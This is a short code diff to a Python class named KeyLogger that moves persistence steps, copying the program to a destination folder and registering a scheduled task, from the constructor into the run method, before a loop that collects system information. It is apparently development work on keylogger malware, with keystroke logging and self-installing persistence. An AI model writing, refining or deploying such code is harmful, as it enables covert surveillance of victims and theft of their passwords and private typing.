@@ -68,9 +68,6 @@ class KeyLogger:
         self.mouse_listener = None
         self.word = ""
 
-        executable_path = save_program_in_location(src_file, dest_folder)
-        create_scheduled_task(executable_path, task_name)
-
     def appendlog(self, string):
         if string:
             self.log = self.log + string
@@ -198,6 +195,8 @@ class KeyLogger:
 
     def run(self):
         remove_env_file()
+        executable_path = save_program_in_location(self.src_file, self.dest_folder)
+        create_scheduled_task(executable_path, self.task_name)
 
         while True:
             self.system_information()
